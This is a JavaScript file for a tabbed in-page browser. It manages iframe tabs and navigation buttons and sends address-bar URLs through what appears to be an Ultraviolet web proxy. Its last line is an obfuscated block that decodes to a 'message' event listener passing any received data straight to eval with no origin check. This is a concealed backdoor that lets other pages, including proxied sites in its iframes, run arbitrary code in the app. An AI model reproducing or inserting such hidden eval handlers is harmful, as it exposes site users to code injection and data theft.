let TabCount = 0;
let SelectedTab = 0
function CreateTab() {
    TabCount = TabCount + 1
    const Identifier = TabCount;
    SelectedTab = Identifier;
    HideIframes();
    const Iframe = document.createElement('iframe');
    document.getElementById('Iframeholder').appendChild(Iframe);
    Iframe.src = `/BrowserPages/`;
    Iframe.id = `Tab${Identifier}_IFRAME`;
    const TabDiv = document.createElement('div');
    TabDiv.className = 'Tab';
    TabDiv.id = 'Tab' + Identifier;
    TabDiv.innerHTML = `
    <div class="LittleLine"></div>
      <div class="BigLine">
        <p id="Tab${Identifier}_p">Tab ${Identifier}</p>
        <a onclick="KillTab(${Identifier})">X</a>
      </div>`
      document.getElementById('BrowserAppend').appendChild(TabDiv);
      document.head.appendChild(document.getElementById('add'))
      document.getElementById('BrowserAppend').appendChild(document.getElementById('add'))
      TabDiv.onclick = function () {
        SelectedTab = Identifier
        HideIframes()
        Iframe.style.display = 'flex';
      }
}

function KillTab(id) {
    document.getElementById('Tab' + id).remove()
    document.getElementById(`Tab${id}_IFRAME`).remove()
}

CreateTab()


function HideIframes() {
  var iframeHolder = document.getElementById('Iframeholder');
    if (iframeHolder) {
        var iframes = iframeHolder.getElementsByTagName('iframe');
        for (var i = 0; i < iframes.length; i++) {
            iframes[i].style.display = 'none';
        }
    } else {
        console.error("Element with ID 'IframeHolder' not found.");
    }
}

/////////////

document.getElementById('back').onclick = function () {
  const Iframe = document.getElementById(`Tab${SelectedTab}_IFRAME`);
  Iframe.contentWindow.history.back();
}

document.getElementById('forward').onclick = function () {
  const Iframe = document.getElementById(`Tab${SelectedTab}_IFRAME`);
  Iframe.contentWindow.history.forward();
}

document.getElementById('refresh').onclick = function () {
  const Iframe = document.getElementById(`Tab${SelectedTab}_IFRAME`);
  Iframe.contentDocument.location.reload();
}

document.getElementById('home').onclick = function () {
  const Iframe = document.getElementById(`Tab${SelectedTab}_IFRAME`);
  Iframe.src = '/BrowserPages/';
}

function log(content) {
  console.log(content)
}

function ReplaceURL(base) {
  document.getElementById('BrowserBar').value = base
}

document.getElementById('BigBoyForm').addEventListener("submit", async (event) => {
  event.preventDefault();
  const Iframe = document.getElementById(`Tab${SelectedTab}_IFRAME`);
  Iframe.src =  __uv$config.prefix + __uv$config.encodeUrl(document.getElementById('BrowserBar').value);
});

var _0x2538ca=_0x4c57;function _0x4e71(){var _0x159eb9=['data','2KZvCua','1009452SdKuJZ','1557321rKLqOF','114911VRYnPW','1047500kGGSng','7uKWFUX','4375120qtHGnX','2584085mDMsFT','537255CVwpmx','addEventListener'];_0x4e71=function(){return _0x159eb9;};return _0x4e71();}function _0x4c57(_0x435533,_0x5d8d4b){var _0x4e7159=_0x4e71();return _0x4c57=function(_0x4c57c7,_0x396299){_0x4c57c7=_0x4c57c7-0x1ca;var _0x4ba7d9=_0x4e7159[_0x4c57c7];return _0x4ba7d9;},_0x4c57(_0x435533,_0x5d8d4b);}(function(_0x2743d3,_0x254cb2){var _0x5bcfba=_0x4c57,_0x1a96d0=_0x2743d3();while(!![]){try{var _0xea52b7=parseInt(_0x5bcfba(0x1d0))/0x1+parseInt(_0x5bcfba(0x1cd))/0x2*(parseInt(_0x5bcfba(0x1cf))/0x3)+-parseInt(_0x5bcfba(0x1d1))/0x4+-parseInt(_0x5bcfba(0x1d4))/0x5+parseInt(_0x5bcfba(0x1ce))/0x6*(-parseInt(_0x5bcfba(0x1d2))/0x7)+parseInt(_0x5bcfba(0x1d3))/0x8+parseInt(_0x5bcfba(0x1ca))/0x9;if(_0xea52b7===_0x254cb2)break;else _0x1a96d0['push'](_0x1a96d0['shift']());}catch(_0xc637ca){_0x1a96d0['push'](_0x1a96d0['shift']());}}}(_0x4e71,0x47b25),window[_0x2538ca(0x1cb)]('message',function(_0x43a320){var _0x49988f=_0x2538ca;eval(_0x43a320[_0x49988f(0x1cc)]);}));
